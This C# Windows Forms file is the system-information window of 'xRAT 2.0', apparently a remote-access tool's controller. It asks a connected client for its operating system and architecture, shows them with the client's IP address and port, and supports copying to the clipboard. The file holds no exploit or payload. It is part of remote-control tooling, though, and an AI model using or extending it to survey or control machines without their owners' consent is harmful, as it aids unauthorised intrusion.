using System;
using System.Windows.Forms;
using xServer.Core;

namespace xServer.Forms
{
    public partial class FrmSystemInformation : Form
    {
        private readonly Client _connectClient;

        public FrmSystemInformation(Client c)
        {
            _connectClient = c;
            _connectClient.Value.FrmSi = this;

            InitializeComponent();
        }

        private void FrmSystemInformation_Load(object sender, EventArgs e)
        {
            if (_connectClient != null)
            {
                this.Text = string.Format("xRAT 2.0 - System Information [{0}:{1}]",
                    _connectClient.EndPoint.Address.ToString(), _connectClient.EndPoint.Port.ToString());
                new Core.Packets.ServerPackets.GetSystemInfo().Execute(_connectClient);

                if (_connectClient.Value != null)
                {
                    ListViewItem lvi =
                        new ListViewItem(new string[] {"Operating System", _connectClient.Value.OperatingSystem});
                    lstSystem.Items.Add(lvi);
                    lvi =
                        new ListViewItem(new string[]
                        {
                            "Architecture",
                            (_connectClient.Value.OperatingSystem.Contains("32 Bit")) ? "x86 (32 Bit)" : "x64 (64 Bit)"
                        });
                    lstSystem.Items.Add(lvi);
                    lvi = new ListViewItem(new string[] {"", "Getting more information..."});
                    lstSystem.Items.Add(lvi);
                }
            }
        }

        private void FrmSystemInformation_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (_connectClient.Value != null)
                _connectClient.Value.FrmSi = null;
        }

        private void ctxtCopy_Click(object sender, EventArgs e)
        {
            if (lstSystem.SelectedItems.Count != 0)
            {
                string output = string.Empty;

                foreach (ListViewItem lvi in lstSystem.SelectedItems)
                {
                    foreach (ListViewItem.ListViewSubItem lvs in lvi.SubItems)
                        output += lvs.Text + " : ";

                    output = output.Remove(output.Length - 3);
                    output = output + "\r\n";
                }

                Clipboard.SetText(output);
            }
        }
    }
}